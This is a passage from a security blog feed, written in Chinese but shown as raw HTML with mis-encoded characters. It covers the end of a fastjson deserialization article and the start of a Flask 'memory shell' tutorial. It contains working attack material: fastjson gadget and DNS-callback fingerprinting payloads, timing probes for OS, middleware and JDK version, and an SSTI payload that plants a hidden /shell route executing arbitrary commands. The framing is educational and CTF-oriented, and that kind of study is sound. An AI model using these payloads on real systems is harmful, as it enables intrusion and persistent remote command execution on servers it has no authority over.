\&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;com.sleepycat.bind.serial.SerialOutput\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;out\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            \&quot;$ref\&quot;: \&quot;$.writer\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409032034460.png" alt="image-20240903203402350"></p><p>buffè¿™é‡Œä¼ çš„æ˜¯base64ä¹‹åçš„æ•°æ®</p><p><strong>è¡¥ä¸åˆ†æ</strong></p><p>é¢é¢é¢è¯¥ç‰ˆæœ¬ä¹‹åçš„è¡¥ä¸åˆæ˜¯ç²—æš´çš„ç»™expectClasså¤šåŠ ä¸Šä¸€äº›é»‘åå•</p><h2 id="safemode"><a href="#SafeMode" class="headerlink" title="SafeMode"></a>SafeMode</h2><p>åœ¨1.2.68ä¹‹åçš„ç‰ˆæœ¬ï¼Œåœ¨1.2.68ç‰ˆæœ¬ä¸­ï¼Œfastjsonå¢åŠ äº†safeModeçš„æ”¯æŒã€‚safeModeæ‰“å¼€åï¼Œå®Œå…¨ç¦ç”¨autoTypeã€‚</p><p>å¼€å¯å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setSafeMode(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p>å¼€å¯ä¹‹åç›´æ¥å®Œå…¨ç¦ç”¨autoTypeï¼Œå³@type</p><p><img src="https://cdn.clown2024.cn/202409032040917.png" alt="image-20240903204034792"></p><p>è·å–æ˜¯å¦è®¾ç½®äº†SafeModeï¼Œå¦‚æœæ˜¯åˆ™ç›´æ¥æŠ›å‡ºå¼‚å¸¸ç»ˆæ­¢è¿è¡Œ</p><h1 id="fastjson1280"><a href="#Fastjson1-2-80" class="headerlink" title="Fastjson1.2.80"></a>Fastjson1.2.80</h1><p>1.2.68ä¹‹åæ–°ç‰ˆæœ¬å°†<code>java.lang.Runnableã€java.lang.Readableå’Œjava.lang.AutoCloseable</code>åŠ å…¥äº†é»‘åå•ï¼Œè¿™é‡Œå°±åˆ©ç”¨å¦ä¸€ä¸ªæœŸæœ›ç±»ï¼Œå¼‚å¸¸ç±»<code>Throwable</code></p><p>è¿™é‡Œå°±çœ‹ä¸€ä¸‹è¿™ç¯‡æ–‡ç« å°±è¡Œäº†ï¼š<a href="https://mp.weixin.qq.com/s/EXnXCy5NoGIgpFjRGfL3wQ%EF%BC%8C%E5%9B%A0%E4%B8%BA%E7%9C%8B%E8%B5%B7%E6%9D%A5%E5%BE%88%E9%9A%BE%E6%9C%89rce%E7%9A%84%E7%82%B9%EF%BC%88%E4%B8%BB%E8%A6%81%E6%98%AF%E6%87%92%E4%BA%86%E4%B8%8D%E6%83%B3%E5%86%8D%E5%86%99%E4%BA%86%F0%9F%98%A2">https://mp.weixin.qq.com/s/EXnXCy5NoGIgpFjRGfL3wQï¼Œå› ä¸ºçœ‹èµ·æ¥å¾ˆéš¾æœ‰rceçš„ç‚¹ï¼ˆä¸»è¦æ˜¯æ‡’äº†ä¸æƒ³å†å†™äº†ğŸ˜¢</a></p><h1 id="ä¿¡æ¯æ¢æµ‹"><a href="#ä¿¡æ¯æ¢æµ‹" class="headerlink" title="ä¿¡æ¯æ¢æµ‹"></a>ä¿¡æ¯æ¢æµ‹</h1><p>å¹³æ—¶ç”¨äºæ¢æµ‹fastjsonçš„ä¸€äº›ä¿¡æ¯æ¥è€ƒè™‘å¦‚ä½•åˆ©ç”¨ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://forum.butian.net/share/2858%EF%BC%8Chttps://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement">https://forum.butian.net/share/2858ï¼Œhttps://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement</a></p><p>ç„¶åä½¿ç”¨safe6Secå¸ˆå‚…çš„å¤ç°ç¯å¢ƒæ¥åšæµ‹è¯•ï¼š<a href="https://github.com/safe6Sec/ShiroAndFastJson">https://github.com/safe6Sec/ShiroAndFastJson</a></p><p>å°†å…¶ä¸­&#x2F;jsonè·¯ç”±çš„ä»£ç ä¿®æ”¹ä¸€ä¸‹æ–¹ä¾¿æŸ¥çœ‹è§£æç»“æœæˆ–è€…è§£ææŠ¥é”™ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@PostMapping(&quot;/json&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title function_">parse</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String data)</span> &#123;<br>    <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>    <span class="hljs-keyword">try</span> &#123;<br>        jsonObject.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-number">0</span>);<br>        jsonObject.put(<span class="hljs-string">&quot;message&quot;</span>, String.valueOf(JSON.parse(data)));<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        jsonObject.put(<span class="hljs-string">&quot;status&quot;</span>, -<span class="hljs-number">1</span>);<br>        jsonObject.put(<span class="hljs-string">&quot;error&quot;</span>, e.getMessage());<br>    &#125;<br>    <span class="hljs-keyword">return</span> jsonObject;<br>&#125;<br></code></pre></td></tr></table></figure><p>åé¢ç›´æ¥å‘&#x2F;jsonè·¯ç”±è¿›è¡Œpostè¯·æ±‚å³å¯</p><h2 id="ç‰ˆæœ¬æ¢æµ‹"><a href="#ç‰ˆæœ¬æ¢æµ‹" class="headerlink" title="ç‰ˆæœ¬æ¢æµ‹"></a>ç‰ˆæœ¬æ¢æµ‹</h2><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement">https://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement</a></p><p><strong>å…·ä½“ç‰ˆæœ¬æ¢æµ‹</strong></p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://b1ue.cn/archives/402.html">https://b1ue.cn/archives/402.html</a></p><p>å…·ä½“åŸç†æ˜¯JavaBeanDeserializer ç±»å¼‚å¸¸çš„ message ä¼šæŠŠå½“å‰ fastjson çš„ç‰ˆæœ¬å·è¾“å‡ºï¼Œæ‰€ä»¥éœ€è¦æ„é€ å‡ºèƒ½ä»¤è¿™ä¸ªç±»æŠ›å‡ºå¼‚å¸¸çš„é”™è¯¯å³å¯</p><p><img src="https://cdn.clown2024.cn/202409052248218.png" alt="image-20240905224846071"></p><p>è¿™é‡Œç›´æ¥åˆ—å‡ºæ–‡ç« éœ€è¦æ»¡è¶³çš„æŠ¥é”™æ¡ä»¶ï¼š</p><ul><li>å½“ä»£ç ä½¿ç”¨ <code>JSON.parseObject(json , clazz)</code> æŒ‡å®šæœŸæœ›ç±»çš„æ–¹å¼å»è§£æ JSONï¼Œä¸” clazz ä¸èƒ½ä¸º fastjson å·²è®¾å®šçš„å¤§éƒ¨åˆ†ç±»å‹ï¼Œå¦‚â€œHashmapâ€ã€â€œArrayListâ€</li><li>å½“ä½¿ç”¨ <code>JSON.parse(json)</code> ä¸æŒ‡å®šæœŸæœ›ç±»çš„æ—¶å€™å¯ä»¥é€šè¿‡ AutoCloseable æ¥è§¦å‘</li></ul><p>æ¯”å¦‚è¿™æ ·ï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>   <span class="hljs-comment">//è¯¥æ–¹æ³•å°è¯•äº†ä¸€ä¸‹ç›´åˆ°1.2.80éƒ½è¿˜å¯ä»¥æ¢æµ‹å‡º</span><br> <br><span class="hljs-comment">//ä¸‹é¢è¿™ä¸ªæ®è¯´ä¹Ÿèƒ½æ¢æµ‹ï¼Œä½†æ˜¯è¯¥é¶åœºæ²¡æœ‰æˆåŠŸ</span><br><span class="hljs-punctuation">[</span><span class="hljs-attr">&quot;test&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409052252040.png" alt="image-20240905225213882"></p><p><strong>æ¢æµ‹DNS</strong></p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/why811/article/details/133679673">https://blog.csdn.net/why811/article/details/133679673</a></p><p>DNSæ¢æµ‹ä¸»è¦æ˜¯ä¸ºäº†æ¢æµ‹æ˜¯å¦ä¸ºfastjson</p><p>è¿™é‡Œdnslogå¯ä»¥ç›´æ¥ç”¨yakitç”Ÿæˆ</p><p><img src="https://cdn.clown2024.cn/202409051322413.png" alt="image-20240905132158243"></p><p>è¿™é‡Œçº¯æ”¶é›†payloadå¤ç°äº†ï¼Œæ²¡æ‰¾åˆ°ä»€ä¹ˆåˆ†æçš„æ–‡ç« </p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.InetAddress&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;muwoiavfqk.dgrh3.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><blockquote><p>ä¸è¿‡è¿™ä¸ªgadgetåœ¨1.2.48ç¦æ­¢äº†</p></blockquote><p>1.2.68ç‰ˆæœ¬ç»“æœ</p><p><img src="https://cdn.clown2024.cn/202409051325045.png" alt="image-20240905132543897"></p><p>ç¬‘æ­»yakitçš„dnslogæ²¡è®°å½•å‡ºæ¥ï¼Œdnslogå¹³å°çš„å¯ä»¥</p><p><img src="https://cdn.clown2024.cn/202409051337491.png" alt="image-20240905133750354"></p><p><img src="https://cdn.clown2024.cn/202409051337590.png" alt="image-20240905133730460"></p><p>å„ç§payload</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet4Address&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet6Address&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-comment">//ä¸‹é¢æ˜¯ä¸€äº›ç•¸å½¢payloadï¼Œä¼šæŠ¥é”™ä½†æ˜¯ä¹Ÿèƒ½è§¦å‘dnslog</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;aaa&quot;</span><span class="hljs-punctuation">&#125;</span><br>Set<span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br>Set<span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯èƒ½æœ‰æ—¶å€™æ¢æµ‹å‡ºç°é—®é¢˜ï¼Œè¯´type not matchï¼Œå…¶å®åŸå› æ˜¯ï¼Œæœ‰çš„å¼€å‘åœ¨ä½¿ç”¨fastjsonè§£æè¯·æ±‚æ—¶ä¼šä½¿ç”¨Springçš„@RequestBodyæ³¨é‡Šï¼Œå‘Šè¯‰è§£æå¼•æ“ï¼Œæˆ‘éœ€è¦çš„æ˜¯ä¸€ä¸ªUserç±»å¯¹è±¡</p><p>æœ€å¤–å±‚ä¸€å®šæ˜¯æ•°ç»„æˆ–è€…å¯¹è±¡ï¼Œä¸è¦åŠ @typeï¼Œç„¶åå°†Payloadä½œä¸ºå…¶ä¸­ä¸€ä¸ªé”®å€¼ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl">&#123;<br><span class="hljs-string">&quot;xxx&quot;</span>: &#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetAddress&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·å†™é€šå¸¸å°±ä¸ä¼šæœ‰type not matchçš„</p><p><code>ä¸‹é¢çš„æ¢æµ‹æ˜¯å­˜åœ¨fastjsonå¹¶ä¸”å¯ä»¥åŠ è½½å­—èŠ‚ç çš„æƒ…å†µï¼Œçº¯ç²¹è®°å½•æ²¡æœ‰å°è¯•è¿‡</code></p><h2 id="æ“ä½œç³»ç»Ÿæ¢æµ‹"><a href="#æ“ä½œç³»ç»Ÿæ¢æµ‹" class="headerlink" title="æ“ä½œç³»ç»Ÿæ¢æµ‹"></a>æ“ä½œç³»ç»Ÿæ¢æµ‹</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">osName</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase();<br>        System.out.println(osName);<br>        <span class="hljs-keyword">if</span> (osName.contains(<span class="hljs-string">&quot;nix&quot;</span>) || osName.contains(<span class="hljs-string">&quot;nux&quot;</span>) || osName.contains(<span class="hljs-string">&quot;mac&quot;</span>))<br>        &#123;<br>            Thread.sleep(<span class="hljs-number">3000</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (osName.contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>            Thread.sleep(<span class="hljs-number">6000</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            Thread.sleep(<span class="hljs-number">9000</span>);<br>        &#125;<br></code></pre></td></tr></table></figure><h2 id="ä¸­é—´ä»¶æ¢æµ‹"><a href="#ä¸­é—´ä»¶æ¢æµ‹" class="headerlink" title="ä¸­é—´ä»¶æ¢æµ‹"></a>ä¸­é—´ä»¶æ¢æµ‹</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">stackTraces</span> <span class="hljs-operator">=</span> Thread.getAllStackTraces();<br>        <span class="hljs-keyword">for</span> (Map.Entry entry : stackTraces.entrySet()) &#123;<br>            StackTraceElement[] stackTraceElements = entry.getValue();<br>            <span class="hljs-keyword">for</span> (StackTraceElement element : stackTraceElements) &#123;<br><span class="hljs-comment">// element.getClassName().contains(&quot;org.springframework.web&quot;</span><br>                <span class="hljs-keyword">if</span> (element.getClassName().contains(<span class="hljs-string">&quot;org.apache.catalina.core&quot;</span>)) &#123;<br>                    Thread.sleep(<span class="hljs-number">5000</span>);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><h2 id="æ¢æµ‹jdkç‰ˆæœ¬"><a href="#æ¢æµ‹JDKç‰ˆæœ¬" class="headerlink" title="æ¢æµ‹JDKç‰ˆæœ¬"></a>æ¢æµ‹JDKç‰ˆæœ¬</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// è·å– Java ç‰ˆæœ¬</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">javaVersion</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;java.version&quot;</span>);<br><span class="hljs-comment">// è§£æä¸»ç‰ˆæœ¬å·</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">majorVersion</span> <span class="hljs-operator">=</span> Integer.parseInt(javaVersion.split(<span class="hljs-string">&quot;\\.&quot;</span>)[<span class="hljs-number">1</span>]);<br><span class="hljs-comment">// è¿›â¾ç‰ˆæœ¬åˆ¤æ–­</span><br>        <span class="hljs-keyword">switch</span> (majorVersion) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>                Thread.sleep(<span class="hljs-number">1000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>                Thread.sleep(<span class="hljs-number">2000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>                Thread.sleep(<span class="hljs-number">3000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>                Thread.sleep(<span class="hljs-number">4000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                Thread.sleep(<span class="hljs-number">5000</span>);<br>                <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;fastjsonä»‹ç»&quot;&gt;&lt;a href=&quot;#fastjsonä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;fastjsonä»‹ç»&quot;&gt;&lt;/a&gt;fastjsonä»‹ç»&lt;/h1&gt;&lt;p&gt;å®˜æ–¹githubåœ°å€ï¼š&lt;a href=&quot;https://github.com</summary>
      
    
    
    
    <category term="javaæ¼æ´" scheme="https://clowsman.github.io/categories/java%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>flaskå†…å­˜é©¬å­¦ä¹ </title>
    <link href="https://clowsman.github.io/2024/08/17/flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/08/17/flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-08-17T08:42:44.000Z</published>
    <updated>2024-10-19T16:57:23.229Z</updated>
    
    <content type="html"><![CDATA[<p>æ‹–äº†å¾ˆä¹…ç»ˆäºæ¥çœ‹ä¸€ä¸‹flaskå†…å­˜é©¬è¿™ä¸ªä¸œè¥¿äº†ï¼Œä¸»è¦æ˜¯å‘ç°æŸæ–°ç”Ÿèµ›week2å°±è¦æ‰“flaskå†…å­˜é©¬ï¼Œèµ¶ç´§æ¥å­¦äº†ğŸ˜¢</p><h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p>å†…å­˜é©¬å°±æ˜¯æ— æ–‡ä»¶webshellï¼Œè¿™ä¸ªä¸å¤šè¯´äº†ï¼Œpythonçš„å†…å­˜é©¬å°±æ˜¯åœ¨ç½‘ç«™è¿è¡Œçš„æ—¶å€™åŠ¨æ€æ³¨å†Œä¸€ä¸ªè·¯ç”±ç”¨äºä»»æ„å‘½ä»¤æ‰§è¡Œã€‚</p><p>pythonçš„å†…å­˜é©¬é€šå¸¸ä¼šé…åˆsstiæˆ–è€…pickleååºåˆ—åŒ–ç­‰æ‰‹æ®µæ¥ä½¿ç”¨ï¼Œä¸»è¦æ˜¯ä¸ºäº†è§£å†³ä¸å‡ºç½‘çš„æƒ…å†µã€‚</p><h1 id="ä½ç‰ˆæœ¬å†…å­˜é©¬"><a href="#ä½ç‰ˆæœ¬å†…å­˜é©¬" class="headerlink" title="ä½ç‰ˆæœ¬å†…å­˜é©¬"></a>ä½ç‰ˆæœ¬å†…å­˜é©¬</h1><p>å…ˆç®€å•å†™ä¸€ä¸ªsstiæ¼æ´çš„flaskæœåŠ¡</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request,render_template_string<br><br>app = Flask(__name__)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    person=<span class="hljs-string">&quot;guest&quot;</span><br>    <span class="hljs-keyword">if</span> request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>):<br>        person=request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    template = <span class="hljs-string">&#x27;&lt;h2&gt;Hello %s!&lt;/h2&gt;&#x27;</span> % person<br>    <span class="hljs-keyword">return</span> render_template_string(template)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>,debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><h2 id="å†…å­˜é©¬æ•ˆæœ"><a href="#å†…å­˜é©¬æ•ˆæœ" class="headerlink" title="å†…å­˜é©¬æ•ˆæœ"></a>å†…å­˜é©¬æ•ˆæœ</h2><p>è¿™æ˜¯ä¸€ä¸ªåŸºç¡€çš„å†…å­˜é©¬payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å»å‘nameä¼ é€’è¿™ä¸ªå‚æ•°çœ‹çœ‹æ•ˆæœ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1:8000/?name=&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;,&#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><blockquote><p>è‰¹è¿™é‡Œæœ‰ä¸ªå‘ï¼Œä¸èƒ½å¼€debugæ¨¡å¼ï¼Œå¼€äº†debugæ¨¡å¼ä¼šæŠ¥ä¸‹é¢çš„é”™è¯¯ï¼Œåˆå®³å¾—æˆ‘æ£€æŸ¥äº†å¥½ä¸€ä¼špayload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">AssertionError: A setup function was called after the first request was handled. This usually indicates a bug in the application where a module was not imported and decorators or other functionality was called too late.<br>To fix this make sure to import all your view modules, database models, and everything related at a central place before the application starts serving requests.<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªæ–­è¨€é”™è¯¯ï¼Œç™¾åº¦ç¿»è¯‘ç»“æœ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">AssertionErrorï¼šåœ¨å¤„ç†ç¬¬ä¸€ä¸ªè¯·æ±‚åè°ƒç”¨äº†è®¾ç½®å‡½æ•°ã€‚è¿™é€šå¸¸è¡¨ç¤ºåº”ç”¨ç¨‹åºä¸­å­˜åœ¨é”™è¯¯ï¼Œå…¶ä¸­æ¨¡å—æœªå¯¼å…¥ï¼Œè£…é¥°å™¨æˆ–å…¶ä»–åŠŸèƒ½è°ƒç”¨è¿‡æ™šã€‚<br>è¦è§£å†³æ­¤é—®é¢˜ï¼Œè¯·ç¡®ä¿åœ¨åº”ç”¨ç¨‹åºå¼€å§‹å¤„ç†è¯·æ±‚ä¹‹å‰ï¼Œå°†æ‰€æœ‰è§†å›¾æ¨¡å—ã€æ•°æ®åº“æ¨¡å‹å’Œæ‰€æœ‰ç›¸å…³å†…å®¹å¯¼å…¥åˆ°ä¸€ä¸ªä¸­å¿ƒä½ç½®ã€‚<br></code></pre></td></tr></table></figure></blockquote><p><img src="https://cdn.clown2024.cn/202410161514511.png" alt="image-20241016151406420"></p><p>è¿™é‡Œå°±æ‰“è¿›å»äº†ï¼Œæˆ‘ä»¬å†å»è®¿é—®ä¸€ä¸‹&#x2F;shellè·¯ç”±cmdä¼ å‚å³å¯</p><p><img src="https://cdn.clown2024.cn/202410161514393.png" alt="image-20241016151454348"></p><h2 id="payloadåˆ†æ"><a href="#payloadåˆ†æ" class="headerlink" title="payloadåˆ†æ"></a>payloadåˆ†æ</h2><p>ç°åœ¨æˆ‘ä»¬å°±æ¥åˆ†æä¸€ä¸‹payloadï¼ŒæŠŠä»–æ‹†æˆè¿™æ ·æ¸…æ™°ä¸€ç‚¹</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json">url_for.__globals__<span class="hljs-punctuation">[</span>&#x27;__builtins__&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;eval&#x27;<span class="hljs-punctuation">]</span>(<br><span class="hljs-string">&quot;app.add_url_rule(</span><br><span class="hljs-string">&#x27;/shell&#x27;, </span><br><span class="hljs-string">&#x27;shell&#x27;, </span><br><span class="hljs-string">lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span><br><span class="hljs-string">)</span><br><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#123;</span><br>&#x27;_request_ctx_stack&#x27;<span class="hljs-punctuation">:</span>url_for.__globals__<span class="hljs-punctuation">[</span>&#x27;_request_ctx_stack&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>&#x27;app&#x27;<span class="hljs-punctuation">:</span>url_for.__globals__<span class="hljs-punctuation">[</span>&#x27;current_app&#x27;<span class="hljs-punctuation">]</span><br><span 